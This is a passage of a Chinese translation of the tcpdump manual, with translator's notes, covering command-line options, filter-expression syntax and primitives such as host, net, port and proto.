来指定要在其上抓包的网络接口.</div><div class="line"></div><div class="line">    此选项在不支持接口列表命令的系统上很有用(nt: 比如, Windows 系统, 或缺乏 ifconfig -a 的UNIX系统); 接口的数字编号在windows 2000 或其后的系统中很有用, 因为这些系统上的接口名字比较复杂, 而不易使用.</div><div class="line"></div><div class="line">    如果tcpdump编译时所依赖的libpcap库太老,-D 选项不会被支持, 因为其中缺乏 pcap_findalldevs()函数.</div><div class="line"></div><div class="line">-e  每行的打印输出中将包括数据包的数据链路层头部信息</div><div class="line"></div><div class="line">-E  spi@ipaddr algo:secret,...</div><div class="line"></div><div class="line">    可通过spi@ipaddr algo:secret 来解密IPsec ESP包(nt | rt:IPsec Encapsulating Security Payload,IPsec 封装安全负载, IPsec可理解为, 一整套对ip数据包的加密协议, ESP 为整个IP 数据包或其中上层协议部分被加密后的数据,前者的工作模式称为隧道模式; 后者的工作模式称为传输模式 . 工作原理, 另需补充).</div><div class="line"></div><div class="line">    需要注意的是, 在终端启动tcpdump 时, 可以为IPv4 ESP packets 设置密钥(secret）.</div><div class="line"></div><div class="line">    可用于加密的算法包括des-cbc, 3des-cbc, blowfish-cbc, rc3-cbc, cast128-cbc, 或者没有(none).默认的是des-cbc(nt: des, Data Encryption Standard, 数据加密标准, 加密算法未知, 另需补充).secret 为用于ESP 的密钥, 使用ASCII 字符串方式表达. 如果以 0x 开头, 该密钥将以16进制方式读入.</div><div class="line"></div><div class="line">    该选项中ESP 的定义遵循RFC2406, 而不是 RFC1827. 并且, 此选项只是用来调试的, 不推荐以真实密钥(secret)来使用该选项, 因为这样不安全: 在命令行中输入的secret 可以被其他人通过ps 等命令查看到.</div><div class="line"></div><div class="line">    除了以上的语法格式(nt: 指spi@ipaddr algo:secret), 还可以在后面添加一个语法输入文件名字供tcpdump 使用(nt：即把spi@ipaddr algo:secret,... 中...换成一个语法文件名). 此文件在接受到第一个ESP　包时会打开此文件, 所以最好此时把赋予tcpdump 的一些特权取消(nt: 可理解为, 这样防范之后, 当该文件为恶意编写时,不至于造成过大损害).</div><div class="line"></div><div class="line">-f  显示外部的IPv4 地址时(nt: foreign IPv4 addresses, 可理解为, 非本机ip地址), 采用数字方式而不是名字.(此选项是用来对付Sun公司的NIS服务器的缺陷(nt: NIS, 网络信息服务, tcpdump 显示外部地址的名字时会用到她提供的名称服务): 此NIS服务器在查询非本地地址名字时,常常会陷入无尽的查询循环).</div><div class="line"></div><div class="line">    由于对外部(foreign)IPv4地址的测试需要用到本地网络接口(nt: tcpdump 抓包时用到的接口)及其IPv4 地址和网络掩码. 如果此地址或网络掩码不可用, 或者此接口根本就没有设置相应网络地址和网络掩码(nt: linux 下的 &apos;any&apos; 网络接口就不需要设置地址和掩码, 不过此&apos;any&apos;接口可以收到系统中所有接口的数据包), 该选项不能正常工作.</div><div class="line"></div><div class="line">-F  file</div><div class="line">    使用file 文件作为过滤条件表达式的输入, 此时命令行上的输入将被忽略.</div><div class="line"></div><div class="line">-i  interface</div><div class="line"></div><div class="line">    指定tcpdump 需要监听的接口.  如果没有指定, tcpdump 会从系统接口列表中搜寻编号最小的已配置好的接口(不包括 loopback 接口).一但找到第一个符合条件的接口, 搜寻马上结束.</div><div class="line"></div><div class="line">    在采用2.2版本或之后版本内核的Linux 操作系统上, &apos;any&apos; 这个虚拟网络接口可被用来接收所有网络接口上的数据包(nt: 这会包括目的是该网络接口的, 也包括目的不是该网络接口的). 需要注意的是如果真实网络接口不能工作在&apos;混杂&apos;模式(promiscuous)下,则无法在&apos;any&apos;这个虚拟的网络接口上抓取其数据包.</div><div class="line"></div><div class="line">    如果 -D 标志被指定, tcpdump会打印系统中的接口编号，而该编号就可用于此处的interface 参数.</div><div class="line"></div><div class="line">-l  对标准输出进行行缓冲(nt: 使标准输出设备遇到一个换行符就马上把这行的内容打印出来).在需要同时观察抓包打印以及保存抓包记录的时候很有用. 比如, 可通过以下命令组合来达到此目的:</div><div class="line">    ``tcpdump  -l  |  tee dat&apos;&apos; 或者 ``tcpdump  -l   &gt; dat  &amp;  tail  -f  dat&apos;&apos;.(nt: 前者使用tee来把tcpdump 的输出同时放到文件dat和标准输出中, 而后者通过重定向操作&apos;&gt;&apos;, 把tcpdump的输出放到dat 文件中, 同时通过tail把dat文件中的内容放到标准输出中)</div><div class="line"></div><div class="line">-L  列出指定网络接口所支持的数据链路层的类型后退出.(nt: 指定接口通过-i 来指定)</div><div class="line"></div><div class="line">-m  module</div><div class="line">    通过module 指定的file 装载SMI MIB 模块(nt: SMI，Structure of Management Information, 管理信息结构MIB, Management Information Base, 管理信息库. 可理解为, 这两者用于SNMP(Simple Network Management Protoco)协议数据包的抓取. 具体SNMP 的工作原理未知, 另需补充).</div><div class="line"></div><div class="line">    此选项可多次使用, 从而为tcpdump 装载不同的MIB 模块.</div><div class="line"></div><div class="line">-M  secret  如果TCP 数据包(TCP segments)有TCP-MD5选项(在RFC 2385有相关描述), 则为其摘要的验证指定一个公共的密钥secret.</div><div class="line"></div><div class="line">-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.</div><div class="line"></div><div class="line">-N  不打印出host 的域名部分. 比如, 如果设置了此选现, tcpdump 将会打印&apos;nic&apos; 而不是 &apos;nic.ddn.mil&apos;.</div><div class="line"></div><div class="line">-O  不启用进行包匹配时所用的优化代码. 当怀疑某些bug是由优化代码引起的, 此选项将很有用.</div><div class="line"></div><div class="line">-p  一般情况下, 把网络接口设置为非&apos;混杂&apos;模式. 但必须注意 , 在特殊情况下此网络接口还是会以&apos;混杂&apos;模式来工作； 从而, &apos;-p&apos; 的设与不设, 不能当做以下选现的代名词:&apos;ether host &#123;local-hw-add&#125;&apos; 或  &apos;ether broadcast&apos;(nt: 前者表示只匹配以太网地址为host 的包, 后者表示匹配以太网地址为广播地址的数据包).</div><div class="line"></div><div class="line">-q  快速(也许用&apos;安静&apos;更好?)打印输出. 即打印很少的协议相关信息, 从而输出行都比较简短.</div><div class="line"></div><div class="line">-R  设定tcpdump 对 ESP/AH 数据包的解析按照 RFC1825而不是RFC1829(nt: AH, 认证头, ESP， 安全负载封装, 这两者会用在IP包的安全传输机制中). 如果此选项被设置, tcpdump 将不会打印出&apos;禁止中继&apos;域(nt: relay prevention field). 另外,由于ESP/AH规范中没有规定ESP/AH数据包必须拥有协议版本号域,所以tcpdump不能从收到的ESP/AH数据包中推导出协议版本号.</div><div class="line"></div><div class="line">-r  file</div><div class="line">    从文件file 中读取包数据. 如果file 字段为 &apos;-&apos; 符号, 则tcpdump 会从标准输入中读取包数据.</div><div class="line"></div><div class="line">-S  打印TCP 数据包的顺序号时, 使用绝对的顺序号, 而不是相对的顺序号.(nt: 相对顺序号可理解为, 相对第一个TCP 包顺序号的差距,比如, 接受方收到第一个数据包的绝对顺序号为232323, 对于后来接收到的第2个,第3个数据包, tcpdump会打印其序列号为1, 2分别表示与第一个数据包的差距为1 和 2. 而如果此时-S 选项被设置, 对于后来接收到的第2个, 第3个数据包会打印出其绝对顺序号:232324, 232325).</div><div class="line"></div><div class="line">-s  snaplen</div><div class="line">    设置tcpdump的数据包抓取长度为snaplen, 如果不设置默认将会是68字节(而支持网络接口分接头(nt: NIT, 上文已有描述,可搜索&apos;网络接口分接头&apos;关键字找到那里)的SunOS系列操作系统中默认的也是最小值是96).68字节对于IP, ICMP(nt: Internet Control Message Protocol,因特网控制报文协议), TCP 以及 UDP 协议的报文已足够, 但对于名称服务(nt: 可理解为dns, nis等服务), NFS服务相关的数据包会产生包截短. 如果产生包截短这种情况, tcpdump的相应打印输出行中会出现&apos;&apos;[|proto]&apos;&apos;的标志（proto 实际会显示为被截短的数据包的相关协议层次). 需要注意的是, 采用长的抓取长度(nt: snaplen比较大), 会增加包的处理时间, 并且会减少tcpdump 可缓存的数据包的数量， 从而会导致数据包的丢失. 所以, 在能抓取我们想要的包的前提下, 抓取长度越小越好.把snaplen 设置为0 意味着让tcpdump自动选择合适的长度来抓取数据包.</div><div class="line"></div><div class="line">-T  type</div><div class="line">    强制tcpdump按type指定的协议所描述的包结构来分析收到的数据包.  目前已知的type 可取的协议为:</div><div class="line">    aodv (Ad-hoc On-demand Distance Vector protocol, 按需距离向量路由协议, 在Ad hoc(点对点模式)网络中使用),</div><div class="line">    cnfp (Cisco  NetFlow  protocol),  rpc(Remote Procedure Call), rtp (Real-Time Applications protocol),</div><div class="line">    rtcp (Real-Time Applications con-trol protocol), snmp (Simple Network Management Protocol),</div><div class="line">    tftp (Trivial File Transfer Protocol, 碎文件协议), vat (Visual Audio Tool, 可用于在internet 上进行电</div><div class="line">    视电话会议的应用层协议), 以及wb (distributed White Board, 可用于网络会议的应用层协议).</div><div class="line"></div><div class="line">-t     在每行输出中不打印时间戳</div><div class="line"></div><div class="line">-tt    不对每行输出的时间进行格式处理(nt: 这种格式一眼可能看不出其含义, 如时间戳打印成1261798315)</div><div class="line"></div><div class="line">-ttt   tcpdump 输出时, 每两行打印之间会延迟一个段时间(以毫秒为单位)</div><div class="line"></div><div class="line">-tttt  在每行打印的时间戳之前添加日期的打印</div><div class="line"></div><div class="line">-u     打印出未加密的NFS 句柄(nt: handle可理解为NFS 中使用的文件句柄, 这将包括文件夹和文件夹中的文件)</div><div class="line"></div><div class="line">-U    使得当tcpdump在使用-w 选项时, 其文件写入与包的保存同步.(nt: 即, 当每个数据包被保存时, 它将及时被写入文件中,而不是等文件的输出缓冲已满时才真正写入此文件)</div><div class="line"></div><div class="line">      -U 标志在老版本的libcap库(nt: tcpdump 所依赖的报文捕获库)上不起作用, 因为其中缺乏pcap_cump_flush()函数.</div><div class="line"></div><div class="line">-v    当分析和打印的时候, 产生详细的输出. 比如, 包的生存时间, 标识, 总长度以及IP包的一些选项. 这也会打开一些附加的包完整性检测, 比如对IP或ICMP包头部的校验和.</div><div class="line"></div><div class="line">-vv   产生比-v更详细的输出. 比如, NFS回应包中的附加域将会被打印, SMB数据包也会被完全解码.</div><div class="line"></div><div class="line">-vvv  产生比-vv更详细的输出. 比如, telent 时所使用的SB, SE 选项将会被打印, 如果telnet同时使用的是图形界面,</div><div class="line">      其相应的图形选项将会以16进制的方式打印出来(nt: telnet 的SB,SE选项含义未知, 另需补充).</div><div class="line"></div><div class="line">-w    把包数据直接写入文件而不进行分析和打印输出. 这些包数据可在随后通过-r 选项来重新读入并进行分析和打印.</div><div class="line"></div><div class="line">-W    filecount</div><div class="line">      此选项与-C 选项配合使用, 这将限制可打开的文件数目, 并且当文件数据超过这里设置的限制时, 依次循环替代之前的文件, 这相当于一个拥有filecount 个文件的文件缓冲池. 同时, 该选项会使得每个文件名的开头会出现足够多并用来占位的0, 这可以方便这些文件被正确的排序.</div><div class="line"></div><div class="line">-x    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制打印出每个包的数据(但不包括连接层的头部).总共打印的数据大小不会超过整个数据包的大小与snaplen 中的最小值. 必须要注意的是, 如果高层协议数据没有snaplen 这么长,并且数据链路层(比如, Ethernet层)有填充数据, 则这些填充数据也会被打印.(nt: so for link  layers  that pad, 未能衔接理解和翻译, 需补充 )</div><div class="line"></div><div class="line">-xx   tcpdump 会打印每个包的头部数据, 同时会以16进制打印出每个包的数据, 其中包括数据链路层的头部.</div><div class="line"></div><div class="line">-X    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制和ASCII码形式打印出每个包的数据(但不包括连接层的头部).这对于分析一些新协议的数据包很方便.</div><div class="line"></div><div class="line">-XX   当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制和ASCII码形式打印出每个包的数据, 其中包括数据链路层的头部.这对于分析一些新协议的数据包很方便.</div><div class="line"></div><div class="line">-y    datalinktype</div><div class="line">      设置tcpdump 只捕获数据链路层协议类型是datalinktype的数据包</div><div class="line"></div><div class="line">-Z    user</div><div class="line">      使tcpdump 放弃自己的超级权限(如果以root用户启动tcpdump, tcpdump将会有超级用户权限), 并把当前tcpdump的用户ID设置为user, 组ID设置为user首要所属组的ID(nt: tcpdump 此处可理解为tcpdump 运行之后对应的进程)</div><div class="line"></div><div class="line">      此选项也可在编译的时候被设置为默认打开.(nt: 此时user 的取值未知, 需补充)</div></pre></td></tr></table></figure>
<h2 id="tcpdump条件表达式"><a href="#tcpdump条件表达式" class="headerlink" title="tcpdump条件表达式"></a>tcpdump条件表达式</h2><p>该表达式用于决定哪些数据包将被打印. 如果不给定条件表达式, 网络上所有被捕获的包都会被打印,否则, 只有满足条件表达式的数据包被打印.(nt: all packets, 可理解为, 所有被指定接口捕获的数据包).</p>
<p>  表达式由一个或多个’表达元’组成(nt: primitive, 表达元, 可理解为组成表达式的基本元素). 一个表达元通常由一个或多个修饰符(qualifiers)后跟一个名字或数字表示的id组成(nt: 即, ‘qualifiers id’).有三种不同类型的修饰符:type, dir以及 proto.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">type 修饰符指定id 所代表的对象类型, id可以是名字也可以是数字. 可选的对象类型有: host, net, port 以及portrange(nt: host 表明id表示主机, net 表明id是网络, port 表明id是端而portrange 表明id 是一个端口范围).  如, &apos;host foo&apos;, &apos;net 128.3&apos;, &apos;port 20&apos;, &apos;portrange 6000-6008&apos;(nt: 分别表示主机 foo,网络 128.3, 端口 20, 端口范围 6000-6008). 如果不指定type 修饰符, id默认的修饰符为host.</div><div class="line"></div><div class="line">dir 修饰符描述id 所对应的传输方向, 即发往id 还是从id 接收（nt: 而id 到底指什么需要看其前面的type 修饰符）.可取的方向为: src, dst, src 或 dst, src并且dst.(nt:分别表示, id是传输源, id是传输目的, id是传输源或者传输目的, id是传输源并且是传输目的). 例如, &apos;src foo&apos;,&apos;dst net 128.3&apos;, &apos;src or dst port ftp-data&apos;.(nt: 分别表示符合条件的数据包中, 源主机是foo, 目的网络是128.3, 源或目的端口为 ftp-data).如果不指定dir修饰符, id 默认的修饰符为src 或 dst.对于链路层的协议,比如SLIP(nt: Serial Line InternetProtocol, 串联线路网际网络协议), 以及linux下指定&apos;any&apos; 设备, 并指定&apos;cooked&apos;(nt | rt: cooked 含义未知, 需补充) 抓取类型, 或其他设备类型,可以用&apos;inbound&apos; 和 &apos;outbount&apos; 修饰符来指定想要的传输方向.</div><div class="line"></div><div class="line">proto 修饰符描述id 所属的协议. 可选的协议有: ether, fddi, tr, wlan, ip, ip6, arp, rarp, decnet, tcp以及 upd.(nt | rt: ether, fddi, tr, 具体含义未知, 需补充. 可理解为物理以太网传输协议, 光纤分布数据网传输协议,以及用于路由跟踪的协议.  wlan, 无线局域网协议; ip,ip6 即通常的TCP/IP协议栈中所使用的ipv4以及ipv6网络层协议;arp, rarp 即地址解析协议,反向地址解析协议; decnet, Digital Equipment Corporation开发的, 最早用于PDP-11 机器互联的网络协议; tcp and udp, 即通常TCP/IP协议栈中的两个传输层协议).</div><div class="line"></div><div class="line">例如, &apos;ether src foo&apos;, `arp net 128.3&apos;, &apos;tcp port 21&apos;, &apos;udp portrange 7000-7009&apos; 分别表示 &apos;从以太网地址foo 来的数据包&apos;,&apos;发往或来自128.3网络的arp协议数据包&apos;, &apos;发送或接收端口为21的tcp协议数据包&apos;, &apos;发送或接收端口范围为7000-7009的udp协议数据包&apos;.</div><div class="line"></div><div class="line">如果不指定proto 修饰符, 则默认为与相应type匹配的修饰符. 例如, &apos;src foo&apos; 含义是 &apos;(ip or arp or rarp) src foo&apos; (nt: 即, 来自主机foo的ip/arp/rarp协议数据包, 默认type为host),`net bar&apos; 含义是`(ip  or  arp  or rarp) net bar&apos;(nt: 即, 来自或发往bar网络的ip/arp/rarp协议数据包),`port 53&apos; 含义是 `(tcp or udp) port 53&apos;(nt: 即, 发送或接收端口为53的tcp/udp协议数据包).(nt: 由于tcpdump 直接通过数据链路层的 BSD 数据包过滤器或 DLPI(datalink provider interface, 数据链层提供者接口)来直接获得网络数据包, 其可抓取的数据包可涵盖上层的各种协议, 包括arp, rarp, icmp(因特网控制报文协议),ip, ip6, tcp, udp, sctp(流控制传输协议).</div><div class="line"></div><div class="line">对于修饰符后跟id 的格式,可理解为, type id 是对包最基本的过滤条件: 即对包相关的主机, 网络, 端口的限制;dir 表示对包的传送方向的限制; proto表示对包相关的协议限制)</div><div class="line"></div><div class="line">&apos;fddi&apos;(nt: Fiber Distributed Data Interface) 实际上与&apos;ether&apos; 含义一样: tcpdump 会把他们当作一种&apos;&apos;指定网络接口上的数据链路层协议&apos;&apos;. 如同ehter网(以太网), FDDI 的头部通常也会有源, 目的, 以及包类型, 从而可以像ether网数据包一样对这些域进行过滤. 此外, FDDI 头部还有其他的域, 但不能被放到表达式中用来过滤</div><div class="line"></div><div class="line">同样, &apos;tr&apos; 和 &apos;wlan&apos; 也和 &apos;ether&apos; 含义一致, 上一段对fddi 的描述同样适用于tr(Token Ring) 和wlan(802.11 wireless LAN)的头部. 对于802.11 协议数据包的头部, 目的域称为DA, 源域称为 SA;而其中的 BSSID, RA, TA 域(nt | rt: 具体含义需补充)不会被检测(nt: 不能被用于包过虑表达式中).</div></pre></td></tr></table></figure>
<p>除以上所描述的表达元(‘primitive’)， 还有其他形式的表达元, 并且与上述表达元格式不同. 比如: gateway, broadcast, less, greater以及算术表达式(nt: 其中每一个都算一种新的表达元). 下面将会对这些表达元进行说明.</p>
<p>表达元之间还可以通过关键字and, or 以及 not 进行连接, 从而可组成比较复杂的条件表达式. 比如,`host foo and not port ftp and not port ftp-data’(nt: 其过滤条件可理解为, 数据包的主机为foo,并且端口不是ftp(端口21) 和ftp-data(端口20, 常用端口和名字的对应可在linux 系统中的/etc/service 文件中找到)).</p>
<p>为了表示方便, 同样的修饰符可以被省略, 如’tcp dst port ftp or ftp-data or domain’ 与以下的表达式含义相同’tcp dst port ftp or tcp dst port ftp-data or tcp dst port domain’.(nt: 其过滤条件可理解为,包的协议为tcp, 目的端口为ftp 或 ftp-data 或 domain(端口53) ).</p>
<p>借助括号以及相应操作符,可把表达元组合在一起使用(由于括号是shell的特殊字符, 所以在shell脚本或终端中使用时必须对括号进行转义, 即’(‘ 与’)’需要分别表达成’(‘ 与 ‘)‘).</p>
<p>有效的操作符有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">否定操作 (`!&apos; 或 `not&apos;)</div><div class="line">与操作(`&amp;&amp;&apos; 或 `and&apos;)</div><div class="line">或操作(`||&apos; 或 `or&apos;)</div></pre></td></tr></table></figure></p>
<p>  否定操作符的优先级别最高. 与操作和或操作优先级别相同, 并且二者的结合顺序是从左到右. 要注意的是, 表达’与操作’时,需要显式写出’and’操作符, 而不只是把前后表达元并列放置(nt: 二者中间的’and’ 操作符不可省略).</p>
<p>如果一个标识符前没有关键字, 则表达式的解析过程中最近用过的关键字(往往也是从左往右距离标识符最近的关键字)将被使用.比如,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">not host vs and ace</div></pre></td></tr></table></figure></p>
<p>  是以下表达的精简:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">not host vs and host ace</div></pre></td></tr></table></figure></p>
<p>而不是not (host vs or ace).(nt: 前两者表示, 所需数据包不是来自或发往host vs, 而是来自或发往ace.而后者表示数据包只要不是来自或发往vs或ac都符合要求)</p>
<p>  整个条件表达式可以被当作一个单独的字符串参数也可以被当作空格分割的多个参数传入tcpdump, 后者更方便些. 通常, 如果表达式中包含元字符(nt: 如正则表达式中的’*’, ‘.’以及shell中的’(‘等字符)， 最好还是使用单独字符串的方式传入. 这时,整个表达式需要被单引号括起来. 多参数的传入方式中, 所有参数最终还是被空格串联在一起, 作为一个字符串被解析.</p>
<h1 id="附录-tcpdump的表达元"><a href="#附录-tcpdump的表达元" class="headerlink" title="附录:tcpdump的表达元"></a>附录:tcpdump的表达元</h1><p>(nt: True 在以下的描述中含义为: 相应条件表达式中只含有以下所列的一个特定表达元, 此时表达式为真, 即条件得到满足)</p>
<h2 id="dst-host-host"><a href="#dst-host-host" class="headerlink" title="dst host host"></a>dst host host</h2><p>如果IPv4/v6 数据包的目的域是host, 则与此对应的条件表达式为真.host 可以是一个ip地址, 也可以是一个主机名.</p>
<h2 id="src-host-host"><a href="#src-host-host" class="headerlink" title="src host host"></a>src host host</h2><p>如果IPv4/v6 数据包的源域是host, 则与此对应的条件表达式为真.<br>host 可以是一个ip地址, 也可以是一个主机名.<br>host host</p>
<p>如果IPv4/v6数据包的源或目的地址是 host, 则与此对应的条件表达式为真.以上的几个host 表达式之前可以添加以下关键字:ip, arp, rarp, 以及 ip6.比如:<br>ip host host<br>也可以表达为:<br>ether proto \ip and host host(nt: 这种表达方式在下面有说明, 其中ip之前需要有\来转义,因为ip 对tcpdump 来说已经是一个关键字了.)</p>
<p>如果host 是一个拥有多个IP 的主机, 那么任何一个地址都会用于包的匹配(nt: 即发向host 的数据包的目的地址可以是这几个IP中的任何一个, 从host 接收的数据包的源地址也可以是这几个IP中的任何一个).</p>
<h2 id="ether-dst-ehost"><a href="#ether-dst-ehost" class="headerlink" title="ether dst ehost"></a>ether dst ehost</h2><p>如果数据包(nt: 指tcpdump 可抓取的数据包, 包括ip 数据包, tcp数据包)的以太网目标地址是ehost,则与此对应的条件表达式为真. Ehost 可以是/etc/ethers 文件中的名字或一个数字地址(nt: 可通过 man ethers 看到对/etc/ethers 文件的描述, 样例中用的是数字地址)</p>
<h2 id="ether-src-ehost"><a href="#ether-src-ehost" class="headerlink" title="ether src ehost"></a>ether src ehost</h2><p>如果数据包的以太网源地址是ehost, 则与此对应的条件表达式为真.</p>
<h2 id="ether-host-ehost"><a href="#ether-host-ehost" class="headerlink" title="ether host ehost"></a>ether host ehost</h2><p>如果数据包的以太网源地址或目标地址是ehost, 则与此对应的条件表达式为真.</p>
<h2 id="gateway-host"><a href="#gateway-host" class="headerlink" title="gateway host"></a>gateway host</h2><p>如果数据包的网关地址是host, 则与此对应的条件表达式为真. 需要注意的是, 这里的网关地址是指以太网地址, 而不是IP 地址(nt | rt: I.e., 例如, 可理解为’注意’.the Ethernet source or destination address, 以太网源和目标地址, 可理解为, 指代上句中的’网关地址’ ).host 必须是名字而不是数字, 并且必须在机器的’主机名-ip地址’以及’主机名-以太地址’两大映射关系中 有其条目(前一映射关系可通过/etc/hosts文件, DNS 或 NIS得到, 而后一映射关系可通过/etc/ethers 文件得到. nt: /etc/ethers并不一定存在 , 可通过man ethers 看到其数据格式, 如何创建该文件, 未知,需补充).也就是说host 的含义是 ether host ehost 而不是 host host, 并且ehost必须是名字而不是数字.<br>目前, 该选项在支持IPv6地址格式的配置环境中不起作用(nt: configuration, 配置环境, 可理解为,通信双方的网络配置).</p>
<h2 id="dst-net-net"><a href="#dst-net-net" class="headerlink" title="dst net net"></a>dst net net</h2><p>如果数据包的目标地址(IPv4或IPv6格式)的网络号字段为 net, 则与此对应的条件表达式为真.net 可以是从网络数据库文件/etc/networks 中的名字, 也可以是一个数字形式的网络编号.</p>
<p>一个数字IPv4 网络编号将以点分四元组(比如, 192.168.1.0), 或点分三元组(比如, 192.168.1 ), 或点分二元组(比如, 172.16), 或单一单元组(比如, 10)来表达;</p>
<p>对应于这四种情况的网络掩码分别是:四元组:255.255.255.255(这也意味着对net 的匹配如同对主机地址(host)的匹配:地址的四个部分都用到了),三元组:255.255.255.0, 二元组: 255.255.0.0, 一元组:255.0.0.0.</p>
<p>对于IPv6 的地址格式, 网络编号必须全部写出来(8个部分必须全部写出来); 相应网络掩码为:ff:ff:ff:ff:ff:ff:ff:ff, 所以IPv6 的网络匹配是真正的’host’方式的匹配(nt | rt | rc:地址的8个部分都会用到,是否不属于网络的字节填写0, 需接下来补充), 但同时需要一个网络掩码长度参数来具体指定前面多少字节为网络掩码(nt: 可通过下面的net net/len 来指定)</p>
<h2 id="src-net-net"><a href="#src-net-net" class="headerlink" title="src net net"></a>src net net</h2><p>如果数据包的源地址(IPv4或IPv6格式)的网络号字段为 net, 则与此对应的条件表达式为真.</p>
<h2 id="net-net"><a href="#net-net" class="headerlink" title="net net"></a>net net</h2><p>如果数据包的源或目的地址(IPv4或IPv6格式)的网络号字段为 net, 则与此对应的条件表达式为真.</p>
<h2 id="net-net-mask-netmask"><a href="#net-net-mask-netmask" class="headerlink" title="net net mask netmask"></a>net net mask netmask</h2><p>如果数据包的源或目的地址(IPv4或IPv6格式)的网络掩码与netmask 匹配, 则与此对应的条件表达式为真.此选项之前还可以配合src和dst来匹配源网络地址或目标网络地址(nt: 比如 src net net mask 255.255.255.0).该选项对于ipv6 网络地址无效.</p>
<h2 id="net-net-len"><a href="#net-net-len" class="headerlink" title="net net/len"></a>net net/len</h2><p>如果数据包的源或目的地址(IPv4或IPv6格式)的网络编号字段的比特数与len相同, 则与此对应的条件表达式为真.此选项之前还可以配合src和dst来匹配源网络地址或目标网络地址(nt | rt | tt: src net net/24, 表示需要匹配源地址的网络编号有24位的数据包).</p>
<h2 id="dst-port-port"><a href="#dst-port-port" class="headerlink" title="dst port port"></a>dst port port</h2><p>如果数据包(包括ip/tcp, ip/udp, ip6/tcp or ip6/udp协议)的目的端口为port, 则与此对应的条件表达式为真.port 可以是一个数字也可以是一个名字(相应名字可以在/etc/services 中找到该名字, 也可以通过man tcp 和man udp来得到相关描述信息 ). 如果使用名字, 则该名字对应的端口号和相应使用的协议都会被检查. 如果只是使用一个数字端口号,则只有相应端口号被检查(比如, dst port 513 将会使tcpdump抓取tcp协议的login 服务和udp协议的who 服务数据包, 而port domain 将会使tcpdump 抓取tcp协议的domain 服务数据包, 以及udp 协议的domain 数据包)(nt | rt: ambiguous name is used 不可理解, 需补充).</p>
<h2 id="src-port-port"><a href="#src-port-port" class="headerlink" title="src port port"></a>src port port</h2><p>如果数据包的源端口为port, 则与此对应的条件表达式为真.</p>
<h2 id="port-port"><a href="#port-port" class="headerlink" title="port port"></a>port port</h2><p>如果数据包的源或目的端口为port, 则与此对应的条件表达式为真.</p>
<h2 id="dst-portrange-port1-port2"><a href="#dst-portrange-port1-port2" class="headerlink" title="dst portrange port1-port2"></a>dst portrange port1-port2</h2><p>如果数据包(包括ip/tcp, ip/udp, ip6/tcp or ip6/udp协议)的目的端口属于port1到port2这个端口范围(包括port1, port2), 则与此对应的条件表达式为真. tcpdump 对port1 和port2 解析与对port 的解析一致(nt:在dst port port 选项的描述中有说明).</p>
<h2 id="src-portrange-port1-port2"><a href="#src-portrange-port1-port2" class="headerlink" title="src portrange port1-port2"></a>src portrange port1-port2</h2><p>如果数据包的源端口属于port1到port2这个端口范围(包括 port1, port2), 则与此对应的条件表达式为真.</p>
<h2 id="portrange-port1-port2"><a href="#portrange-port1-port2" class="headerlink" title="portrange port1-port2"></a>portrange port1-port2</h2><p>如果数据包的源端口或目的端口属于port1到port2这个端口范围(包括 port1, port2), 则与此对应的条件表达式为真.</p>
<p>以上关于port 的选项都可以在其前面添加关键字:tcp 或者udp, 比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcp src port port</div></pre></td></tr></table></figure></p>
<p>这将使tcpdump 只抓取源端口是port 的tcp数据包.</p>
<h2 id="less-length"><a href="#less-length" class="headerlink" title="less length"></a>less length</h2><p>如果数据包的长度比length 小或等于length, 则与此对应的条件表达式为真. 这与<code>len &lt;= length</code>  的含义一致. greater length如果数据包的长度比length 大或等于length, 则与此对应的条件表达式为真. 这与<code>len &gt;= length&#39;</code>的含义一致.</p>
<h2 id="ip-proto-protocol"><a href="#ip-proto-protocol" class="headerlink" title="ip proto protocol"></a>ip proto protocol</h2><p>如果数据包为ipv4数据包并且其协议类型为protocol, 则与此对应的条件表达式为真.<br>Protocol 可以是一个数字也可以是名字, 比如:icmp6, igmp, igrp(nt: Interior Gateway Routing Protocol,内部网关路由协议), pim(Protocol Independent Multicast, 独立组播协议, 应用于组播路由器),ah, esp(nt: ah, 认证头, esp 安全负载封装, 这两者会用在IP包的安全传输机制中 ), vrrp(Virtual Router Redundancy Protocol, 虚拟路由器冗余协议), udp, or tcp. 由于tcp , udp 以及icmp是tcpdump 的关键字,所以在这些协议名字之前必须要用\来进行转义(如果在C-shell 中需要用\来进行转义). 注意此表达元不会把数据包中协议头链中所有协议头内容全部打印出来(nt: 实际上只会打印指定协议的一些头部信息, 比如可以用tcpdump -i eth0 ‘ip proto \tcp and host 192.168.3.144’, 则只打印主机192.168.3.144 发出或接收的数据包中tcp 协议头所包含的信息)</p>
<h2 id="ip6-proto-protocol"><a href="#ip6-proto-protocol" class="headerlink" title="ip6 proto protocol"></a>ip6 proto protocol</h2><p>如果数据包为ipv6数据包并且其协议类型为protocol, 则与此对应的条件表达式为真.<br>注意此表达元不会把数据包中协议头链中所有协议头内容全部打印出来</p>
<h2 id="ip6-protochain-protocol"><a href="#ip6-protochain-protocol" class="headerlink" title="ip6 protochain protocol"></a>ip6 protochain protocol</h2><p>如果数据包为ipv6数据包并且其协议链中包含类型为protocol协议头, 则与此对应的条件表达式为真. 比如,ip6 protochain 6</p>
<p>将匹配其协议头链中拥有TCP 协议头的IPv6数据包.此数据包的IPv6头和TCP头之间可能还会包含验证头, 路由头, 或者逐跳寻径选项头.</p>
<p>由此所触发的相应BPF(Berkeley Packets Filter, 可理解为, 在数据链路层提供数据包过滤的一种机制)代码比较繁琐,并且BPF优化代码也未能照顾到此部分, 从而此选项所触发的包匹配可能会比较慢.</p>
